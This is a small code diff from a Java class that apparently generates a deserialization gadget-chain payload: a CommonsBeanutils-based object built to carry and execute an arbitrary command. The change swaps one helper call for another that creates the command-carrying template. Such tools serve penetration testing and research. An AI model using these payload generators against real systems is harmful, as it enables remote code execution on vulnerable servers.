@@ -30,7 +30,7 @@ public class CommonsBeanutilsPropertySource183 implements CommandObjectPayload<O
 	@Override
 	public Object getObject(String command) throws Exception {
 
-		final Object template = Gadgets.createTemplatesImpl(command);
+		final Object template = Gadgets.createTemplates4Cmd(command);
 		PropertySource propertySource1 = new PropertySource() {
 			@Override
 			public int getPriority() {
